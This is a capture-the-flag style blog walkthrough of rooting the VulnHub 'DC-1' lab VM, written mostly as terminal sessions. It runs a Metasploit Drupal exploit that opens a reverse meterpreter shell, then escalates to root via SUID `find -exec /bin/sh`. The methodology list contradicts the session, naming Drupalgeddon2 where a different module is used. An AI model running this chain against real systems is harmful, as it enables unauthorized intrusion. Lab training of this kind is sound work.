@@ -1,0 +1,326 @@
+---
+title: boot2root
+date: 2023-12-13 00:50 EST
+categories:
+  - OSCP
+tags:
+  - oscp
+  - pen200
+  - offsec
+  - certs
+---
+Hello friends! Today we are going to take another boot2root challenge known as “DC-1: 1”. The credit for making this VM machine goes to “DCAU” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM here.
+
+Security Level: Beginner
+
+## Penetrating Methodology:
+
+- IP Discovery using netdiscover
+- Network scanning (Nmap)
+- Surfing HTTPS service port (80)
+- Finding Drupal CMS
+- Exploiting Drupalgeddon2 to get a reverse shell
+- Finding files with SUID bit set
+- Finding the “find” command with SUID bit set
+- Getting root shell with “find” command
+- Getting final flag
+Walkthrough
+
+Let’s start off with scanning the network to find our target.
+~~~                                                                                                                                                           
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480                                                                                                     
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.100.1   00:50:56:c0:00:08      4     240  VMware, Inc.                                                                                    
+ 192.168.100.2   00:50:56:e2:05:4a      2     120  VMware, Inc.                                                                                    
+ 192.168.100.130 00:0c:29:99:14:a2      1      60  VMware, Inc.                                                                                    
+ 192.168.100.254 00:50:56:f0:77:e1      1      60  VMware, Inc.
+~~~
+We found our target –> 192.168.100.130
+
+Our next step is to scan our target with nmap.
+~~~
+┌──(alpha㉿Sploit)-[~/vulnhub/DC-1]
+└─$ sudo nmap 192.168.100.130 -p- -A -sV -oN nmap                                                           
+[sudo] password for alpha: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-13 00:50 EST
+Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 67.32% done; ETC: 00:50 (0:00:01 remaining)
+Nmap scan report for 192.168.100.130
+Host is up (0.00048s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Welcome to Drupal Site | Drupal Site
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.2.22 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          37813/tcp   status
+|   100024  1          45796/udp6  status
+|   100024  1          51411/tcp6  status
+|_  100024  1          60475/udp   status
+37813/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:99:14:A2 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 192.168.100.130
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.78 seconds
+~~~
+~~~
+┌──(alpha㉿Sploit)-[~/alpha-academy/python]
+└─$ whatweb 192.168.100.130                                                                                 
+http://192.168.100.130 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.100.130], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]
+~~~
+~~~
+┌──(alpha㉿Sploit)-[~/alpha-academy/python]
+└─$ msfconsole  
+Metasploit tip: Use sessions -1 to interact with the last opened session
+                                                  
+                                              `:oDFo:`                            
+                                           ./ymM0dayMmy/.                                                                                                              
+                                        -+dHJ5aGFyZGVyIQ==+-                                                                                                           
+                                    `:sm⏣~~Destroy.No.Data~~s:`                                                                                                        
+                                 -+h2~~Maintain.No.Persistence~~h+-                                                                                                    
+                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                                                                                                 
+                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.                                                                                             
+                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-                                                                                          
+                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-                                                                                         
+                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:                                                                                         
+                      :we're.all.alike'`                     The.PFYroy.No.D7:                                                                                         
+                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:                                                                                         
+                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:                                                                                         
+                      :---srwxrwx:-.`                        `MS146.52.No.Per:                                                                                         
+                      :<script>.Ac816/                        sENbove3101.404:                                                                                         
+                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                                                                                         
+                      :09.14.2011.raid                       /STFU|wall.No.Pr:                                                                                         
+                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                                                                                         
+                      :#OUTHOUSE-  -s:                       /corykennedyData:                                                                                         
+                      :$nmap -oS                              SSo.6178306Ence:                                                                                         
+                      :Awsm.da:                            /shMTl#beats3o.No.:                                                                                         
+                      :Ring0:                             `dDestRoyREXKC3ta/M:                                                                                         
+                      :23d:                               sSETEC.ASTRONOMYist:                                                                                         
+                       /-                        /yo-    .ence.N:(){ :|: & };:                                                                                         
+                                                 `:Shall.We.Play.A.Game?tron/                                                                                          
+                                                 ```-ooy.if1ghtf0r+ehUser5`                                                                                            
+                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                                              
+                                              `MjM~~WE.ARE.se~~MMjMs                                                                                                   
+                                               +~KANSAS.CITY's~-`                                                                                                      
+                                                J~HAKCERS~./.`                                                                                                         
+                                                .esc:wq!:`                                                                                                             
+                                                 +++ATH`                                                                                                               
+                                                  `                                                                                                                    
+                                                                                                                                                                       
+
+       =[ metasploit v6.3.45-dev                          ]
++ -- --=[ 2377 exploits - 1232 auxiliary - 416 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search Drupal
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+
+Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval
+
+msf6 > use 2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/drupal_drupageddon) > optios
+[-] Unknown command: optios
+msf6 exploit(multi/http/drupal_drupageddon) > options
+
+Module options (exploit/multi/http/drupal_drupageddon):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The target URI of the Drupal installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.100.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 192.168.100.130
+rhosts => 192.168.100.130
+msf6 exploit(multi/http/drupal_drupageddon) > run
+
+[*] Started reverse TCP handler on 192.168.100.128:4444 
+[*] Sending stage (39927 bytes) to 192.168.100.130
+[*] Meterpreter session 1 opened (192.168.100.128:4444 -> 192.168.100.130:46569) at 2023-12-13 00:40:00 -0500
+
+meterpreter > pwd
+/var/www
+meterpreter > shell
+Process 3829 created.
+Channel 0 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@DC-1:/var/www$ cd
+cd
+bash: cd: HOME not set
+www-data@DC-1:/var/www$ cd ../..
+cd ../..
+www-data@DC-1:/$ cd
+cd
+bash: cd: HOME not set
+www-data@DC-1:/$ pwd
+pwd
+/
+www-data@DC-1:/$ cd /home
+cd /home
+www-data@DC-1:/home$ ls
+ls
+flag4
+www-data@DC-1:/home$ cat flag4
+cat flag4
+cat: flag4: Is a directory
+www-data@DC-1:/home$ file flag4
+file flag4
+flag4: directory
+www-data@DC-1:/home$ cd flag4
+cd flag4
+www-data@DC-1:/home/flag4$ ls
+ls
+flag4.txt
+www-data@DC-1:/home/flag4$ cat /flag4.txt
+cat /flag4.txt
+cat: /flag4.txt: No such file or directory
+www-data@DC-1:/home/flag4$ cat flag4.txt
+cat flag4.txt
+Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+www-data@DC-1:/home/flag4$ cd 
+cd 
+bash: cd: HOME not set
+www-data@DC-1:/home/flag4$ cd ..
+cd ..
+www-data@DC-1:/home$ cd ..
+cd ..
+www-data@DC-1:/$ ls
+ls
+bin   home            lib64       opt   sbin     tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  selinux  usr
+dev   initrd.img.old  media       root  srv      var
+etc   lib             mnt         run   sys      vmlinuz
+www-data@DC-1:/$ cd /usr
+cd /usr
+www-data@DC-1:/usr$ ls
+ls
+bin  games  include  lib  lib64  local  sbin  share  src
+www-data@DC-1:/usr$ cd
+cd
+bash: cd: HOME not set
+www-data@DC-1:/usr$ cd /tmp
+cd /tmp
+www-data@DC-1:/tmp$ ls
+ls
+hello
+www-data@DC-1:/tmp$ rm -rf hello
+rm -rf hello
+www-data@DC-1:/tmp$ ls
+ls
+www-data@DC-1:/tmp$ touch hello
+touch hello
+www-data@DC-1:/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+www-data@DC-1:/tmp$ find hello -exec "whoami" \;
+find hello -exec "whoami" \;
+root
+www-data@DC-1:/tmp$ find hello -exec "/bin/sh" \;
+find hello -exec "/bin/sh" \;
+# ls
+ls
+hello
+# cd /root
+cd /root
+# ls
+ls
+thefinalflag.txt
+# cat thefinalflag.txt
+cat thefinalflag.txt
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+# 
+~~~
